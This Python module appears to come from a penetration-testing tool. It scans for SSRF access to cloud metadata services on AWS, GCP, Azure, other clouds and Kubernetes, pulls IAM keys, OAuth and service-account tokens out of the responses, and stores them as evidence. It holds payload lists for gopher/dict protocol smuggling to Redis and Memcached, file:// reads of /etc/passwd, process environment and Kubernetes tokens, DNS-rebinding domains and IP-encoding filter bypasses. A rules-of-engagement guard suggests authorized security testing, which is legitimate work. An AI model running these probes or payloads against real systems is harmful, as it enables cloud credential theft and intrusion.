import ipaddress
import json
import re
import time
from urllib.parse import urlparse, urlunparse

import httpx

from .config import load_engine
from .roe_guard import ROEGuard, ROEViolation


AWS_IMDS_BASE = "http://169.254.169.254"
AWS_TOKEN_URL = f"{AWS_IMDS_BASE}/latest/api/token"
AWS_METADATA_BASE = f"{AWS_IMDS_BASE}/latest/meta-data"
AWS_CREDS_PATH = f"{AWS_METADATA_BASE}/iam/security-credentials/"
AWS_USERDATA = f"{AWS_IMDS_BASE}/latest/user-data"

GCP_HOST = "metadata.google.internal"
GCP_ALT_HOST = "169.254.169.254"
GCP_BASE = f"http://{GCP_HOST}/computeMetadata/v1"
GCP_ALT_BASE = f"http://{GCP_ALT_HOST}/computeMetadata/v1"
GCP_FLAVOR = "Metadata-Flavor: Google"

AZURE_BASE = "http://169.254.169.254"
AZURE_INSTANCE = f"{AZURE_BASE}/metadata/instance?api-version=2021-02-01"
AZURE_TOKEN_ARM = f"{AZURE_BASE}/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
AZURE_TOKEN_KV = f"{AZURE_BASE}/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
AZURE_TOKEN_GRAPH = f"{AZURE_BASE}/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://graph.microsoft.com/"
AZURE_HEADER = "Metadata: true"

DO_BASE = "http://169.254.169.254/metadata/v1/"
DO_JSON = "http://169.254.169.254/metadata/v1.json"

ALIBABA_BASE = "http://100.100.100.200/latest/meta-data/"

ORACLE_BASE = "http://169.254.169.254/opc/v2/instance/"
ORACLE_HEADER = "Authorization: Bearer Oracle"

K8S_SA_TOKEN = "http://kubernetes.default.svc/api/v1/namespaces/default/secrets"
K8S_FILE_TOKEN = "file:///var/run/secrets/kubernetes.io/serviceaccount/token"
K8S_FILE_NAMESPACE = "file:///var/run/secrets/kubernetes.io/serviceaccount/namespace"
K8S_FILE_CA = "file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt"

ECS_CREDS_ENV = "http://169.254.170.2"
ECS_CREDS_PATH = "/v2/credentials/"
LAMBDA_RUNTIME = "http://127.0.0.1:9001/2018-06-01/runtime/invocation/next"

PROTOCOL_SMUGGLING = [
    "gopher://127.0.0.1:6379/_INFO",
    "gopher://127.0.0.1:6379/_CONFIG%20GET%20dir",
    "gopher://127.0.0.1:11211/_stats",
    "dict://127.0.0.1:6379/INFO",
    "dict://127.0.0.1:11211/stats",
    "file:///etc/passwd",
    "file:///etc/hostname",
    "file:///proc/self/environ",
    "file:///c:/windows/win.ini",
    "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
]

DNS_REBIND_DOMAINS = [
    "169.254.169.254.nip.io",
    "169.254.169.254.sslip.io",
    "169.254.169.254.xip.io",
]

CRED_PATTERNS = [
    (r"ASIA[A-Z0-9]{16}", "AWS access key (ASIA temporary)"),
    (r"AKIA[A-Z0-9]{16}", "AWS access key (AKIA long-term)"),
    (r'"SecretAccessKey"\s*:\s*"[^"]{20,}"', "AWS secret access key"),
    (r'"Token"\s*:\s*"[^"]{50,}"', "AWS session token"),
    (r"ya29\.[A-Za-z0-9_\-]{20,}", "GCP OAuth access token"),
    (r'"access_token"\s*:\s*"eyJ[A-Za-z0-9_\-]{20,}"', "OAuth JWT token"),
    (r'"client_secret"\s*:\s*"[^"]{10,}"', "OAuth client secret"),
    (r'"private_key"\s*:\s*"-----BEGIN', "GCP service account key"),
    (r"-----BEGIN (?:RSA |EC )?PRIVATE KEY-----", "private key material"),
    (r"eyJ[A-Za-z0-9_\-]{20,}\.eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}",
     "JWT token"),
    (r"subscriptionId['\"]?\s*[:=]\s*['\"]?[0-9a-f]{8}-", "Azure subscription ID"),
    (r"tenantId['\"]?\s*[:=]\s*['\"]?[0-9a-f]{8}-", "Azure tenant ID"),
]

APP_TOKEN_PATTERNS = [
    (r"\bASIA[A-Z0-9]{16}\b", "AWS ASIA key in response"),
    (r"\bAKIA[A-Z0-9]{16}\b", "AWS AKIA key in response"),
    (r'"AccessKeyId"\s*:\s*"', "AccessKeyId field"),
    (r'"SecretAccessKey"\s*:\s*"', "SecretAccessKey field"),
    (r'"SessionToken"\s*:\s*"', "SessionToken field"),
    (r'"Token"\s*:\s*"[A-Za-z0-9+/=]{40,}"', "session token field"),
    (r"role-arn", "role ARN reference"),
    (r"arn:aws:iam::[0-9]{12}:role/", "AWS role ARN"),
    (r"availability-zone", "AWS availability zone"),
]

HTML_ERROR_SIGNATURES = [
    "<!doctype html", "<html", "<head>", "404 not found",
    "403 forbidden", "access denied",
]


def _verify_tls():
    try:
        cfg = load_engine() or {}
        return bool(cfg.get("http", {}).get("verify_tls", True))
    except Exception:
        return True


def _roe_block(guard, url, method="GET"):
    if guard is None:
        return None
    try:
        guard.check_url(url, method)
        return None
    except ROEViolation as e:
        return str(e)


def _is_html(text):
    if not text:
        return False
    low = text.lstrip().lower()[:200]
    return any(low.startswith(s) for s in HTML_ERROR_SIGNATURES)


def _is_imds_response(text, headers):
    if not text:
        return False
    if _is_html(text):
        return False
    low = text.lower()
    for marker in ("ami-id", "instance-id", "metadata", "security-credentials",
                   "secretaccesskey", "accesskeyid", "computeMetadata",
                   "service-accounts", "managed identity", "subscriptionid"):
        if marker in low:
            return True
    if "application/json" in (headers.get("content-type") or "").lower():
        try:
            data = json.loads(text)
            if isinstance(data, dict) and any(
                k in data for k in ("AccessKeyId", "access_token",
                                    "SecretAccessKey", "Token",
                                    "computeMetadata")):
                return True
            if isinstance(data, dict) and any(
                k in data for k in ("compute", "network", "instance")):
                return True
        except Exception:
            pass
    return False


def _extract_credentials(body):
    hits = []
    for pat, label in CRED_PATTERNS:
        for m in re.finditer(pat, body):
            hits.append({"label": label, "match": m.group(0)[:120]})
    return hits


def _extract_app_indicators(body):
    hits = []
    for pat, label in APP_TOKEN_PATTERNS:
        if re.search(pat, body):
            hits.append(label)
    return hits


def _build_bypass_variants(base_url):
    parsed = urlparse(base_url)
    host = parsed.hostname or ""
    variants = []
    if host == "169.254.169.254":
        variants.append((parsed._replace(netloc="2852039166").geturl(), "decimal"))
        variants.append((parsed._replace(netloc="0xA9FEA9FE").geturl(), "hex"))
        variants.append((parsed._replace(netloc="0251.0376.0251.0376").geturl(), "octal"))
        variants.append((parsed._replace(netloc="169.254.169.0254").geturl(), "mixed-octal"))
        variants.append((parsed._replace(netloc="0xA9.0xFE.0xA9.0xFE").geturl(), "mixed-hex"))
    if host == "metadata.google.internal":
        variants.append((parsed._replace(netloc="169.254.169.254").geturl(), "ip-alt"))
    return variants


def probe_single(url, method="GET", headers=None, timeout=8, verify=None,
                 roe_guard=None, body=None):
    if verify is None:
        verify = _verify_tls()
    viol = _roe_block(roe_guard, url, method)
    if viol:
        return {"url": url, "blocked": True, "error": f"ROE_BLOCK: {viol}"}
    h = dict(headers or {})
    try:
        with httpx.Client(timeout=timeout, verify=verify,
                          follow_redirects=False) as c:
            if method.upper() == "PUT":
                r = c.put(url, headers=h, content=body)
            else:
                r = c.get(url, headers=h)
        return {"url": url, "status": r.status_code,
                "body": (r.text or "")[:6000],
                "headers": {k.lower(): v for k, v in r.headers.items()}}
    except httpx.ConnectError as e:
        return {"url": url, "status": None, "error": f"connection error: {e}"}
    except httpx.TimeoutException:
        return {"url": url, "status": None, "error": "timeout"}
    except Exception as e:
        return {"url": url, "status": None,
                "error": f"{type(e).__name__}: {e}"}


def probe_aws_imdsv1(timeout=8, verify=None, roe_guard=None):
    out = {"provider": "aws", "mode": "imdsv1", "steps": []}
    r1 = probe_single(AWS_METADATA_BASE, timeout=timeout, verify=verify,
                      roe_guard=roe_guard)
    out["steps"].append({"name": "metadata_root", **r1})
    if r1.get("status") != 200 or not _is_imds_response(r1.get("body"), r1.get("headers") or {}):
        out["verdict"] = "PASS"
        out["reason"] = "IMDSv1 root not reachable or non-metadata response"
        return out

    r2 = probe_single(AWS_CREDS_PATH, timeout=timeout, verify=verify,
                      roe_guard=roe_guard)
    out["steps"].append({"name": "role_list", **r2})
    if r2.get("status") != 200:
        out["verdict"] = "SUSPICIOUS"
        out["reason"] = "IMDSv1 reachable but role listing failed"
        return out

    role_name = (r2.get("body") or "").strip().splitlines()[0].strip()
    if not role_name:
        out["verdict"] = "SUSPICIOUS"
        out["reason"] = "IMDSv1 reachable but no role name returned"
        return out

    r3 = probe_single(AWS_CREDS_PATH + role_name, timeout=timeout,
                      verify=verify, roe_guard=roe_guard)
    out["steps"].append({"name": "role_creds", "role": role_name, **r3})
    creds = _extract_credentials(r3.get("body") or "")
    if creds:
        out["verdict"] = "VULNERABLE"
        out["reason"] = f"AWS IMDSv1 exposed IAM credentials for role '{role_name}'"
        out["evidence"] = {"role": role_name, "credentials": creds}
    else:
        out["verdict"] = "SUSPICIOUS"
        out["reason"] = f"IMDSv1 reachable, role '{role_name}' accessible, but no credential pattern matched"
    return out


def probe_aws_imdsv2(timeout=8, verify=None, roe_guard=None):
    out = {"provider": "aws", "mode": "imdsv2", "steps": []}
    token_resp = probe_single(AWS_TOKEN_URL, method="PUT",
                              headers={"X-aws-ec2-metadata-token-ttl-seconds": "21600"},
                              timeout=timeout, verify=verify, roe_guard=roe_guard)
    out["steps"].append({"name": "token_request", **token_resp})
    if token_resp.get("status") not in (200, 201) or not token_resp.get("body"):
        out["verdict"] = "PASS"
        out["reason"] = "IMDSv2 token request rejected (v2 enforced, GET-only SSRF cannot bypass)"
        return out

    token = (token_resp.get("body") or "").strip()
    if not token or len(token) < 10:
        out["verdict"] = "PASS"
        out["reason"] = "IMDSv2 token response was empty or malformed"
        return out

    r2 = probe_single(AWS_CREDS_PATH, headers={"X-aws-ec2-metadata-token": token},
                      timeout=timeout, verify=verify, roe_guard=roe_guard)
    out["steps"].append({"name": "role_list_with_token", **r2})
    if r2.get("status") != 200:
        out["verdict"] = "SUSPICIOUS"
        out["reason"] = "IMDSv2 token acquired but role listing failed (header may not be forwarded by SSRF)"
        return out

    role_name = (r2.get("body") or "").strip().splitlines()[0].strip()
    r3 = probe_single(AWS_CREDS_PATH + role_name,
                      headers={"X-aws-ec2-metadata-token": token},
                      timeout=timeout, verify=verify, roe_guard=roe_guard)
    out["steps"].append({"name": "role_creds", "role": role_name, **r3})
    creds = _extract_credentials(r3.get("body") or "")
    if creds:
        out["verdict"] = "VULNERABLE"
        out["reason"] = f"IMDSv2 bypassed (token PUT + header forwarding) for role '{role_name}'"
        out["evidence"] = {"role": role_name, "credentials": creds,
                           "token_length": len(token)}
    else:
        out["verdict"] = "SUSPICIOUS"
        out["reason"] = f"IMDSv2 token acquired, role '{role_name}' accessible, no credential pattern matched"
    return out


def probe_gcp(timeout=8, verify=None, roe_guard=None):
    out = {"provider": "gcp", "steps": []}
    headers = {"Metadata-Flavor": "Google"}
    r1 = probe_single(GCP_BASE + "/instance/service-accounts/default/token",
                      headers=headers, timeout=timeout, verify=verify,
                      roe_guard=roe_guard)
    out["steps"].append({"name": "token_endpoint", **r1})
    if r1.get("status") == 200 and "ya29." in (r1.get("body") or ""):
        out["verdict"] = "VULNERABLE"
        out["reason"] = "GCP metadata server exposed OAuth access token"
        out["evidence"] = {"credentials": _extract_credentials(r1.get("body") or "")}
        return out

    r2 = probe_single(GCP_ALT_BASE + "/instance/service-accounts/default/token",
                      headers=headers, timeout=timeout, verify=verify,
                      roe_guard=roe_guard)
    out["steps"].append({"name": "token_endpoint_alt_ip", **r2})
    if r2.get("status") == 200 and "ya29." in (r2.get("body") or ""):
        out["verdict"] = "VULNERABLE"
        out["reason"] = "GCP metadata server (alt IP) exposed OAuth access token"
        out["evidence"] = {"credentials": _extract_credentials(r2.get("body") or "")}
        return out

    r3 = probe_single(GCP_BASE + "/project/project-id", headers=headers,
                      timeout=timeout, verify=verify, roe_guard=roe_guard)
    out["steps"].append({"name": "project_id", **r3})
    if r3.get("status") == 200 and (r3.get("body") or "").strip():
        out["verdict"] = "SUSPICIOUS"
        out["reason"] = "GCP metadata reachable (project ID exposed) but token not retrieved"
        return out

    out["verdict"] = "PASS"
    out["reason"] = "GCP metadata server not reachable with Metadata-Flavor header"
    return out


def probe_azure(timeout=8, verify=None, roe_guard=None):
    out = {"provider": "azure", "steps": []}
    headers = {"Metadata": "true"}

    r1 = probe_single(AZURE_INSTANCE, headers=headers, timeout=timeout,
                      verify=verify, roe_guard=roe_guard)
    out["steps"].append({"name": "instance_metadata", **r1})
    if r1.get("status") == 200 and "subscriptionId" in (r1.get("body") or "").lower():
        out["verdict"] = "SUSPICIOUS"
        out["reason"] = "Azure IMDS reachable (instance metadata exposed)"
        out["evidence"] = {"instance": (r1.get("body") or "")[:500]}
    else:
        out["verdict"] = "PASS"
        out["reason"] = "Azure IMDS not reachable"
        return out

    for name, url, res in (
        ("token_arm", AZURE_TOKEN_ARM, "https://management.azure.com/"),
        ("token_keyvault", AZURE_TOKEN_KV, "https://vault.azure.net"),
        ("token_graph", AZURE_TOKEN_GRAPH, "https://graph.microsoft.com/"),
    ):
        r = probe_single(url, headers=headers, timeout=timeout, verify=verify,
                         roe_guard=roe_guard)
        out["steps"].append({"name": name, "resource": res, **r})
        if r.get("status") == 200 and '"access_token"' in (r.get("body") or ""):
            out["verdict"] = "VULNERABLE"
            out["reason"] = f"Azure IMDS returned managed identity token for {res}"
            out["evidence"] = {"resource": res,
                               "credentials": _extract_credentials(r.get("body") or "")}
            return out

    return out


def probe_digitalocean(timeout=8, verify=None, roe_guard=None):
    out = {"provider": "digitalocean", "steps": []}
    r = probe_single(DO_JSON, timeout=timeout, verify=verify, roe_guard=roe_guard)
    out["steps"].append({"name": "metadata_json", **r})
    body = r.get("body") or ""
    if r.get("status") == 200 and ("droplet_id" in body.lower() or "region" in body.lower()):
        out["verdict"] = "SUSPICIOUS"
        out["reason"] = "DigitalOcean metadata reachable (droplet info exposed)"
        out["evidence"] = {"instance": body[:500]}
    else:
        out["verdict"] = "PASS"
        out["reason"] = "DigitalOcean metadata not reachable"
    return out


def probe_alibaba(timeout=8, verify=None, roe_guard=None):
    out = {"provider": "alibaba", "steps": []}
    r = probe_single(ALIBABA_BASE + "instance-id", timeout=timeout,
                     verify=verify, roe_guard=roe_guard)
    out["steps"].append({"name": "instance_id", **r})
    if r.get("status") == 200 and (r.get("body") or "").strip():
        out["verdict"] = "SUSPICIOUS"
        out["reason"] = "Alibaba Cloud metadata reachable (instance-id exposed)"
        out["evidence"] = {"body": (r.get("body") or "")[:200]}
    else:
        out["verdict"] = "PASS"
        out["reason"] = "Alibaba Cloud metadata not reachable"
    return out


def probe_oracle(timeout=8, verify=None, roe_guard=None):
    out = {"provider": "oracle", "steps": []}
    headers = {"Authorization": "Bearer Oracle"}
    r = probe_single(ORACLE_BASE, headers=headers, timeout=timeout,
                     verify=verify, roe_guard=roe_guard)
    out["steps"].append({"name": "instance", **r})
    if r.get("status") == 200 and "compartmentId" in (r.get("body") or ""):
        out["verdict"] = "SUSPICIOUS"
        out["reason"] = "Oracle Cloud metadata reachable"
        out["evidence"] = {"body": (r.get("body") or "")[:300]}
    else:
        out["verdict"] = "PASS"
        out["reason"] = "Oracle Cloud metadata not reachable"
    return out


def probe_protocol_smuggling(base_param_url, timeout=8, verify=None,
                             roe_guard=None, param_name="url"):
    out = {"vectors": [], "verdict": "PASS", "reason": "no protocol smuggling succeeded"}
    findings = []
    for payload in PROTOCOL_SMUGGLING:
        probe_url = base_param_url.replace("FUZZ", payload) if "FUZZ" in base_param_url else base_param_url
        viol = _roe_block(roe_guard, probe_url, "GET")
        if viol:
            out["vectors"].append({"payload": payload, "blocked": viol})
            continue
        r = probe_single(probe_url, timeout=timeout, verify=verify,
                         roe_guard=roe_guard)
        body = r.get("body") or ""
        status = r.get("status")
        if status == 200 and body and not _is_html(body):
            if any(sig in body.lower() for sig in
                   ("root:x:", "daemon:", "# redis", "redis_version",
                    "memcached", "stats", "windows", "127.0.0.1", "localhost",
                    "BEGIN")):
                findings.append({"payload": payload, "evidence": body[:300]})
        out["vectors"].append({"payload": payload, "status": status,
                               "body_preview": body[:200]})
    if findings:
        out["verdict"] = "SUSPICIOUS"
        out["reason"] = f"{len(findings)} protocol smuggling vector(s) returned non-HTTP data"
        out["findings"] = findings
    return out


def probe_dns_rebinding(base_param_url, timeout=8, verify=None,
                        roe_guard=None, cloud_path="/latest/meta-data/"):
    out = {"vectors": [], "verdict": "PASS", "reason": "no DNS rebinding bypass succeeded"}
    for domain in DNS_REBIND_DOMAINS:
        for scheme in ("http", "https"):
            url = f"{scheme}://{domain}{cloud_path}"
            viol = _roe_block(roe_guard, url, "GET")
            if viol:
                out["vectors"].append({"domain": domain, "blocked": viol})
                continue
            r = probe_single(url, timeout=timeout, verify=verify,
                             roe_guard=roe_guard)
            body = r.get("body") or ""
            if r.get("status") == 200 and _is_imds_response(body, r.get("headers") or {}):
                out["verdict"] = "VULNERABLE"
                out["reason"] = f"DNS rebinding via {domain} reached cloud metadata"
                out["evidence"] = {"domain": domain, "body": body[:500]}
                return out
            out["vectors"].append({"domain": domain, "scheme": scheme,
                                   "status": r.get("status")})
    return out


def probe_k8s(timeout=8, verify=None, roe_guard=None):
    out = {"provider": "kubernetes", "steps": []}
    for name, url in (("sa_token", K8S_SA_TOKEN),
                      ("sa_namespace", K8S_FILE_NAMESPACE),
                      ("sa_ca", K8S_FILE_CA)):
        r = probe_single(url, timeout=timeout, verify=verify, roe_guard=roe_guard)
        out["steps"].append({"name": name, **r})
        body = r.get("body") or ""
        if name == "sa_token" and r.get("status") == 200 and body.startswith("eyJ"):
            out["verdict"] = "SUSPICIOUS"
            out["reason"] = "K8s ServiceAccount token reachable via SSRF"
            out["evidence"] = {"token_prefix": body[:40]}
            return out
    out["verdict"] = "PASS"
    out["reason"] = "K8s SA token or secret API not reachable"
    return out


def probe_ecs_lambda(timeout=8, verify=None, roe_guard=None):
    out = {"provider": "aws-container", "steps": []}
    r1 = probe_single(LAMBDA_RUNTIME, timeout=timeout, verify=verify,
                      roe_guard=roe_guard)
    out["steps"].append({"name": "lambda_runtime", **r1})
    if r1.get("status") == 200 and r1.get("body"):
        out["verdict"] = "SUSPICIOUS"
        out["reason"] = "Lambda runtime API reachable (127.0.0.1:9001)"
        out["evidence"] = {"body_preview": (r1.get("body") or "")[:300]}
        return out

    r2 = probe_single(ECS_CREDS_ENV + ECS_CREDS_PATH, timeout=timeout,
                      verify=verify, roe_guard=roe_guard)
    out["steps"].append({"name": "ecs_credentials", **r2})
    if r2.get("status") in (200, 401, 403, 404):
        if r2.get("status") == 200 and "AccessKeyId" in (r2.get("body") or ""):
            out["verdict"] = "VULNERABLE"
            out["reason"] = "ECS credential endpoint reachable with valid creds"
            out["evidence"] = _extract_credentials(r2.get("body") or "")
        else:
            out["verdict"] = "SUSPICIOUS"
            out["reason"] = "ECS credential endpoint responded (needs AWS_CONTAINER_CREDENTIALS_RELATIVE_URI to exploit)"
        return out
    out["verdict"] = "PASS"
    out["reason"] = "Neither Lambda runtime nor ECS credential endpoint reachable"
    return out


def probe_ip_bypasses(base_url, timeout=8, verify=None, roe_guard=None):
    out = {"variants": [], "verdict": "PASS", "reason": "no encoding bypass succeeded"}
    for variant_url, label in _build_bypass_variants(base_url):
        r = probe_single(variant_url, timeout=timeout, verify=verify,
                         roe_guard=roe_guard)
        out["variants"].append({"label": label, "url": variant_url,
                                "status": r.get("status")})
        if r.get("status") == 200 and _is_imds_response(r.get("body") or "",
                                                         r.get("headers") or {}):
            out["verdict"] = "VULNERABLE"
            out["reason"] = f"IP encoding bypass ({label}) reached cloud metadata"
            out["evidence"] = {"label": label, "url": variant_url,
                               "body": (r.get("body") or "")[:500]}
            return out
    return out


def scan(base_url=None, timeout=8, verify=None, roe_guard=None,
         include_protocol_smuggling=False, fuzz_param_url=None):
    if verify is None:
        verify = _verify_tls()

    out = {
        "target": base_url or "(local)",
        "providers": {},
        "bypasses": {},
        "protocol_smuggling": None,
        "overall": "UNKNOWN",
        "reason": "",
    }

    providers = [
        ("aws_imdsv1", probe_aws_imdsv1),
        ("aws_imdsv2", probe_aws_imdsv2),
        ("aws_container", probe_ecs_lambda),
        ("gcp", probe_gcp),
        ("azure", probe_azure),
        ("digitalocean", probe_digitalocean),
        ("alibaba", probe_alibaba),
        ("oracle", probe_oracle),
        ("kubernetes", probe_k8s),
    ]

    for name, fn in providers:
        try:
            out["providers"][name] = fn(timeout=timeout, verify=verify,
                                         roe_guard=roe_guard)
        except Exception as e:
            out["providers"][name] = {"verdict": "UNKNOWN",
                                       "reason": f"{type(e).__name__}: {e}"}

    if base_url:
        try:
            out["bypasses"]["encoding"] = probe_ip_bypasses(
                AWS_METADATA_BASE, timeout=timeout, verify=verify,
                roe_guard=roe_guard)
            out["bypasses"]["dns_rebind"] = probe_dns_rebinding(
                base_url, timeout=timeout, verify=verify, roe_guard=roe_guard)
        except Exception as e:
            out["bypasses"]["error"] = f"{type(e).__name__}: {e}"

    if include_protocol_smuggling and fuzz_param_url:
        try:
            out["protocol_smuggling"] = probe_protocol_smuggling(
                fuzz_param_url, timeout=timeout, verify=verify,
                roe_guard=roe_guard)
        except Exception as e:
            out["protocol_smuggling"] = {"verdict": "UNKNOWN",
                                          "reason": f"{type(e).__name__}: {e}"}

    rank = {"VULNERABLE": 3, "SUSPICIOUS": 2, "PASS": 1, "UNKNOWN": 0}
    overall = "UNKNOWN"
    for r in out["providers"].values():
        if rank.get(r.get("verdict"), 0) > rank.get(overall, 0):
            overall = r["verdict"]
    for r in out["bypasses"].values():
        if isinstance(r, dict) and rank.get(r.get("verdict"), 0) > rank.get(overall, 0):
            overall = r["verdict"]
    if isinstance(out["protocol_smuggling"], dict):
        r = out["protocol_smuggling"]
        if rank.get(r.get("verdict"), 0) > rank.get(overall, 0):
            overall = r["verdict"]

    out["overall"] = overall
    if overall == "VULNERABLE":
        vuln = [k for k, v in out["providers"].items()
                if v.get("verdict") == "VULNERABLE"]
        vuln += [k for k, v in out["bypasses"].items()
                 if isinstance(v, dict) and v.get("verdict") == "VULNERABLE"]
        out["reason"] = f"Cloud metadata reached: {', '.join(vuln)}"
    elif overall == "SUSPICIOUS":
        susp = [k for k, v in out["providers"].items()
                if v.get("verdict") == "SUSPICIOUS"]
        out["reason"] = f"Cloud metadata partially reachable: {', '.join(susp)}"
    elif overall == "PASS":
        out["reason"] = "no cloud metadata endpoint reachable"
    else:
        out["reason"] = "probes did not complete (check errors)"
    return out
